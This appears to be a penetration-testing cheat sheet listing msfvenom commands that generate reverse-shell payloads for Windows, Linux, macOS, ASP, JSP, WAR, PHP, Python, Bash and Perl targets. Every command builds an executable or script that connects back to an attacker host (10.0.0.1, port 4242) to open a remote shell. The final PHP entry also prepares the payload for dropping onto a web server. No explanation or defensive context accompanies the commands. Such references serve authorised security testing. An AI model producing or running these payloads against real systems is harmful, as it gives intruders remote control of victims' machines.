### Windows Staged reverse TCP

	msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe

### Windows Stageless reverse TCP

	msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe

### Linux Staged reverse TCP

	msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf

### Linux Stageless reverse TCP

	msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf

### Other platforms

	$ msfvenom -p linux/x86/shell/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
	
	$ msfvenom -p windows/shell/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
	
	$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
	
	$ msfvenom -p windows/shell/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
	
	$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
	
	$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
	
	$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
	
	$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
	
	$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
	
	$ msfvenom -p php/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php